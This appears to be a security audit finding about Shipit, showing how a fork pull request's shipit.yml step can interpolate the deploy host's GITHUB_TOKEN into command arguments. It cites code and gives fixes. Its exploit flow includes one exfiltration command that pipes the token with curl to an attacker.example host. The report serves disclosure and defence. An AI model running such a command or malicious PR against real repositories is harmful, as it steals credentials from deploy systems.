### Title
`shipit.yml` step arguments on an attacker-controlled fork branch can interpolate `$GITHUB_TOKEN` via `Command#interpolated_arguments` - ([File: lib/shipit/command.rb], [File: lib/shipit/environment_variables.rb])

### Summary
`Command#interpolated_arguments` calls `EnvironmentVariables#interpolate` on every argument string before `PTY.spawn`, substituting any `$VARNAME` token found in the command's `@env` hash with its literal value, with no whitelist check. Task/deploy/rollback step strings for a `ReviewStack` come straight from the `shipit.yml` checked out on the PR's own head branch — a branch entirely controlled by the PR author — and `TaskCommands#env` unconditionally includes the real `GITHUB_TOKEN` in that same `@env` hash, so a fork-authored step string containing `$GITHUB_TOKEN` renders the secret into `argv`.

### Finding Description
The broken binding: `GITHUB_TOKEN` scoped to authorize deploys for the authorized repository == a value never readable by argv content written by an unprivileged fork PR. This fails to hold.

- `ReviewStack.branch` is set directly from attacker-controlled webhook data: `branch: params.pull_request.head.ref` in `ReviewStackAdapter#stack_attributes` [1](#0-0) , created for `opened`/`labeled` events controllable purely by the PR author (`provision?` only checks `allow_all`/label conditions, not authorship) [2](#0-1) .
- The stack is then checked out and deployed at that branch; `TaskCommands#deploy_spec` reads `shipit.yml` from `@task.working_directory`, i.e., from the checked-out fork branch content, and `steps`/`dependencies_steps!`/etc. become raw command-line strings passed into `Command.new(command_line, env:, chdir:)` [3](#0-2) .
- `TaskCommands#env` merges the base env — which includes the real deploy-time `GITHUB_TOKEN` — with stack/task env, with no filtering of the step command's own argument content: `.merge('GITHUB_TOKEN' => github.token)` in `Commands#base_env` [4](#0-3) , propagated through `TaskCommands#env`'s `super.merge(...)` chain [5](#0-4) .
- At `Command#start`, `interpolated_arguments` calls `interpolate_environment_variables(@args)` → `EnvironmentVariables.with(env).interpolate(argument)` [6](#0-5) [7](#0-6) . `interpolate` does a blind regex substitution of any `$WORD` token against `@env`, with **no whitelist**: `argument.gsub(/(\$\w+)/) { ... @env.fetch(variable) { ENV[variable] } }` [8](#0-7) .
- The existing `permit`/`sanitize_env_vars` whitelist mechanism (`EnvironmentVariables#permit`, used by `DeploySpec#filter_deploy_envs`/`filter_rollback_envs`) only restricts which **user-supplied task env vars** are accepted into the env hash [9](#0-8) ; it is never applied to the interpolation step, and it does nothing to prevent a step's own argument string from referencing `$GITHUB_TOKEN`, which is always present in `env` regardless of the whitelist.

Exploit flow: attacker opens a PR from their own fork with a `shipit.yml` deploy step like `echo $GITHUB_TOKEN | curl -d @- https://attacker.example`, opens/labels the PR to trigger `ReviewStack` provisioning (or it auto-provisions under `allow_all`), Shipit checks out the fork branch, and when the deploy/task step executes, `Command#start` interpolates `$GITHUB_TOKEN` from the deploy host's real token into the literal argv passed to `PTY.spawn`, exfiltrating it to an attacker-controlled endpoint.

### Impact Explanation
This is Critical: exfiltration of `GITHUB_TOKEN` (the deploy-time GitHub credential) from the deploy host, achievable by any user able to open a pull request against a repository with Review Stacks enabled. Since the token used is `Shipit.github(organization: @stack.repository.owner).token`, its scope covers the target repository/organization, giving the attacker a live, exfiltrated GitHub credential usable outside of Shipit — for other repositories in the same organization/app installation, depending on the App's/PAT's actual scope. This is repeatable on every deploy attempt and against any repository that has Review Stacks (or even non-review Task/Deploy execution of an attacker-influenced branch) enabled.

### Likelihood Explanation
Preconditions: the target repository must have Review Stacks enabled (`review_stacks_enabled`), with a `provisioning_behavior` that doesn't strictly require maintainer approval (`allow_all` or `allow_with_label` where the label can be self-applied by the PR author, per `pull_request_has_provisioning_label?`) [10](#0-9) . Given this common configuration for open-source/monorepo CI-style review apps, attacker cost is minimal: open a PR with a malicious `shipit.yml` step. No Shipit credentials or GitHub App secrets are required at any point.

### Recommendation
Do not perform unrestricted environment-variable interpolation on arbitrary shipit.yml-authored command strings. At minimum:
1. In `EnvironmentVariables#interpolate`, restrict substitution to an explicit whitelist of variables the spec author is allowed to reference (mirroring `permit`'s `variable_definitions`), excluding secrets like `GITHUB_TOKEN`, `GITHUB_DOMAIN`, or anything derived from `Shipit.github`.
2. Alternatively/complementarily, never inject `GITHUB_TOKEN` (or other secret credentials) into the same `env` hash that is passed through `EnvironmentVariables#interpolate`; instead inject secrets only via `unbundled_env`'s process-level env (already inherited by the child process for tools that need it, e.g. `git`) without making them substitutable inside argument strings.
3. Treat all `shipit.yml` content from a PR's head branch as untrusted for ReviewStacks unless the repository owner has explicitly opted into trusting fork content.

### Proof of Concept
```ruby
# test/unit/command_test.rb (conceptual addition)
test "interpolated_arguments leaks secret env values referenced by attacker-controlled argument strings" do
  command = Shipit::Command.new(
    "echo", "$GITHUB_TOKEN",
    env: { "GITHUB_TOKEN" => "secret-token" },
    chdir: "/tmp"
  )

  # Binding under test: GITHUB_TOKEN scoped for deploy auth must never
  # appear in argv content originating from an untrusted shipit.yml step.
  refute_includes command.interpolated_arguments, "secret-token" # FAILS today

  assert_includes command.interpolated_arguments, "secret-token" # demonstrates current (vulnerable) behavior
end
```
This reproduces, without any live GitHub call, that an argument string equal to the `EnvironmentVariables` interpolation pattern (`$GITHUB_TOKEN`) resolves through `Command#interpolated_arguments` into the literal secret value that would be handed to `PTY.spawn`.

### Citations

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L87-94)
```ruby
          def stack_attributes
            {
              branch: params.pull_request.head.ref,
              environment:,
              ignore_ci: false,
              continuous_deployment: false
            }
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/opened_handler.rb (L60-78)
```ruby
          def respond_to_pull_request_opened?
            params.action == "opened" &&
              provision?
          end

          def provision?
            repository.review_stacks_enabled &&
              repository.provisioning_behavior_allow_all? ||
              (repository.provisioning_behavior_allow_with_label? && pull_request_has_provisioning_label?) ||
              (repository.provisioning_behavior_prevent_with_label? && !pull_request_has_provisioning_label?)
          end

          def pull_request_has_provisioning_label?
            pull_request_label_names.include?(repository.provisioning_label_name)
          end

          def pull_request_label_names
            Array.new(pull_request["labels"]).map { |label| label["name"] }
          end
```

**File:** lib/shipit/task_commands.rb (L17-27)
```ruby
    def install_dependencies
      deploy_spec.dependencies_steps!.map do |command_line|
        Command.new(command_line, env:, chdir: steps_directory)
      end
    end

    def perform
      steps.map do |command_line|
        Command.new(command_line, env:, chdir: steps_directory)
      end
    end
```

**File:** lib/shipit/task_commands.rb (L33-48)
```ruby
    def env
      super
        .merge(@stack.env)
        .merge(
          'SHIPIT_USER' => "#{@task.author.login} (#{normalized_author_name}) via Shipit",
          'EMAIL' => @task.author.email,
          'BUNDLE_PATH' => Rails.root.join('data', 'bundler').to_s,
          'SHIPIT_LINK' => @task.permalink,
          'TASK_ID' => @task.id.to_s,
          'IGNORED_SAFETIES' => @task.ignored_safeties? ? '1' : '0',
          'GIT_COMMITTER_NAME' => @task.user&.name || Shipit.committer_name,
          'GIT_COMMITTER_EMAIL' => @task.user&.email || Shipit.committer_email
        )
        .merge(deploy_spec.machine_env)
        .merge(@task.env)
    end
```

**File:** lib/shipit/commands.rb (L37-50)
```ruby
    def base_env
      @base_env ||= begin
        env = Shipit.env.merge(
          'GITHUB_DOMAIN' => github.domain,
          'GITHUB_TOKEN' => github.token
        )

        if Shipit.use_git_askpass?
          env['GIT_ASKPASS'] = Shipit::Engine.root.join('lib', 'snippets', 'git-askpass').realpath.to_s
        end

        env
      end
    end
```

**File:** lib/shipit/command.rb (L51-55)
```ruby
    def interpolate_environment_variables(argument)
      return argument.map { |a| interpolate_environment_variables(a) } if argument.is_a?(Array)

      EnvironmentVariables.with(env).interpolate(argument)
    end
```

**File:** lib/shipit/command.rb (L81-98)
```ruby
    def interpolated_arguments
      interpolate_environment_variables(@args)
    end

    def start(&block)
      return if @started

      @control_block = block
      @out = @pid = nil
      FileUtils.mkdir_p(@chdir)
      begin
        @out, child_in, @pid = PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)
        child_in.close
      rescue Errno::ENOENT
        raise NotFound, "#{Shellwords.split(interpolated_arguments.first).first}: command not found"
      rescue Errno::EACCES
        raise Denied, "#{Shellwords.split(interpolated_arguments.first).first}: Permission denied"
      end
```

**File:** lib/shipit/environment_variables.rb (L20-27)
```ruby
    def interpolate(argument)
      return argument unless @env

      argument.gsub(/(\$\w+)/) do |variable|
        variable.sub!('$', '')
        Shellwords.escape(@env.fetch(variable) { ENV[variable] })
      end
    end
```

**File:** app/models/shipit/deploy_spec.rb (L174-180)
```ruby
    def filter_deploy_envs(env)
      EnvironmentVariables.with(env).permit(deploy_variables)
    end

    def filter_rollback_envs(env)
      EnvironmentVariables.with(env).permit(rollback_variables)
    end
```
